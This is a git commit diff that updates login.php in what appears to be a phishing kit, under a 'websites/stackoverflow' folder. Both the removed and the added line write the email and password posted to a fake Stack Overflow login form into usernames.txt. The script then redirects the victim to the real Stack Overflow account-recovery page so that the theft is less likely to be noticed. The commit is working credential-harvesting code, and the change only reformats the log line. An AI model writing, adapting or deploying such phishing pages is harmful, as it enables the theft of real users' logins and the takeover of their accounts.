64cd048e94e2a38e126fc4faf5f2febeccb49921
Tahmid Rayat <56682134+htr-tech@users.noreply.github.com>
2019-11-27 21:17:06 +0600

    Update login.php

--- websites/stackoverflow/login.php
+++ websites/stackoverflow/login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "StackoverFlow :- username : " . $_POST['email'] . "  || Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://stackoverflow.com/users/account-recovery');
 exit();
